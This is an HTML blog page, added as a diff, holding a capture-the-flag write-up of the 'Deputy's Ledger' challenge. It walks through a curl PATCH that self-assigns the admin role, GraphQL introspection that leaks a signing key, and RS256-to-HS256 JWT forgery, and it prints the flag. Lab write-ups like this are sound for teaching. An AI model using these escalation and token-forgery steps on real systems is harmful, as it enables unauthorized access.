@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Deputy's Ledger — AFRICC CTF — cuddest</title>
+<meta name="description" content="JWT algorithm confusion plus privilege escalation via GraphQL introspection.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>AFRICC 2026</span><span>18 min read</span></p>
+    <h1>Deputy's Ledger</h1>
+  </header>
+  <div class="wpost-body">
+
+<p>The first page was just a briefing. It gave me two accounts:</p>
+
+<pre><code>analyst:hunting4bugs
+guest:guest123</code></pre>
+
+<p>Both were described as normal members of one organization, and the challenge explicitly said that no admin account existed anywhere. That last sentence was almost an instruction: I was probably supposed to make one.</p>
+
+<h2>Recon</h2>
+
+<p><code>/api</code> exposed the application's endpoint list:</p>
+
+<pre><code>{
+  "endpoints": [
+    "/api/login",
+    "/api/whoami",
+    "/api/ledger/&lt;org_id&gt;/records",
+    "/api/ledger/&lt;org_id&gt;/master",
+    "/api/ledger/&lt;org_id&gt;/members/&lt;username&gt; [PATCH]",
+    "/graphql"
+  ]
+}</code></pre>
+
+<p>Logging in as <code>analyst</code> returned a JWT with <code>RS256</code> and <code>org_id: acme</code>. The master ledger endpoint returned <code>forbidden</code> because it required the admin role.</p>
+
+<h2>Creating an Admin</h2>
+
+<p>The member-management endpoint immediately stood out. It was supposed to edit a member, but there was no restriction preventing me from editing myself and no allowlist for which fields could be changed.</p>
+
+<pre><code>curl -X PATCH .../api/ledger/acme/members/analyst \
+  -H "Authorization: Bearer $T" \
+  -d '{"role":"admin"}'</code></pre>
+
+<p>The response confirmed the role change. Now the master ledger endpoint opened. Unfortunately, it did not contain the flag — only an internal reserve note. <code>acme</code> was not the target organization.</p>
+
+<h2>GraphQL</h2>
+
+<p>The <code>/graphql</code> endpoint had introspection enabled. The <code>internalDirectory</code> field exposed:</p>
+
+<pre><code>orgs
+users
+signingKeyPem</code></pre>
+
+<p>This revealed a second organization (<code>globex</code>), a user named <code>director</code>, and the RSA public key used to verify JWTs.</p>
+
+<h2>RS256 to HS256 Algorithm Confusion</h2>
+
+<p>The server was verifying RS256 tokens, and I now had the public RSA key. The classic algorithm-confusion attack was possible.</p>
+
+<p>I created a token with <code>HS256</code> and payload <code>{ "sub": "director", "org_id": "globex" }</code>, using the raw PEM bytes as the HMAC key. The trailing newline had to remain intact — the first time I stripped it, signature verification failed.</p>
+
+<p>With the PEM preserved byte-for-byte, the forged token was accepted.</p>
+
+<h2>Escalating Again</h2>
+
+<p>The same unsafe PATCH endpoint was still there. This time I targeted the Globex account:</p>
+
+<pre><code>curl -X PATCH .../api/ledger/globex/members/director \
+  -d '{"role":"admin"}'</code></pre>
+
+<p>The role changed to admin. The master ledger endpoint finally opened.</p>
+
+<h2>Flag</h2>
+
+<div class="answer">africc{d3putys_l3dg3r_h4s_s0_much_fun}</div>
+
+<h2>Full Chain</h2>
+
+<pre><code>Self-service role modification
+        ↓
+Become admin in acme
+        ↓
+GraphQL introspection
+        ↓
+Discover globex and RSA public key
+        ↓
+RS256 → HS256 algorithm confusion
+        ↓
+Forge token as globex/director
+        ↓
+Repeat role modification in globex
+        ↓
+Read master ledger → Flag</code></pre>
+
+<p>What made this challenge interesting was that there were really two independent authorization failures chained together. The PATCH endpoint broke the role boundary inside an organization. The JWT algorithm confusion then broke the organization boundary itself.</p>
+
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
